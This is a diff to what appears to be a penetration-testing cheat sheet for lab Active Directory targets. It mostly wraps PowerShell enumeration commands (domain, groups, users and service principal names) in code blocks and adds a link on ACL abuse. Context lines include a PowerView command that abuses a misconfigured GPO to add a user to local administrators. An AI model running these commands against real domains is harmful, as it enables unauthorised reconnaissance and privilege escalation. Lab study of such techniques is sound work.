@@ -19,13 +19,12 @@ rdate -n 10.10.10.52
 ### RPC
 https://www.hackingarticles.in/active-directory-enumeration-rpcclient/
 
-Get-ADGroupMember -Identity 'Web Admins' -Recursive
 
 ### Active Directory Enumeration: BloodHound
 https://www.hackingarticles.in/active-directory-enumeration-bloodhound/
 https://swepstopia.com/bloodhound-enumeration/
 
-
+```
 Get-ADDomain
 (Get-ADDomain).DomainSID
 Get-ADDefaultDomainPasswordPolicy
@@ -33,10 +32,12 @@ Get-ADForest -Identity heist.offsec
 Get-ADGroup -Filter "*" | Select 'Name
 Get-ADGroupMember -Identity 'Web Admins' -Recursive
 Get-ADPrincipalGroupMembership -Identity enox
-
+```
+```
 Get-ADuser -Filter * -Properties * | select SamAccountName
 Get-ADuser -Filter * -Properties * | select servicePrincipalName
 Get-ADUser -Filter * -Properties * | Where {$_.ServicePrincipalName -ne $null} | Select 'Name','ServicePrincipalName'
+```
 
 
 
@@ -360,6 +361,9 @@ Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityRefere
 **Get New Powerview 3.0
 New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators anirudh /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
 ```
+
+### ACL
+https://book.hacktricks.xyz/windows/active-directory-methodology/acl-persistence-abuse
 
 ### LAPS
 https://www.hackingarticles.in/credential-dumpinglaps/
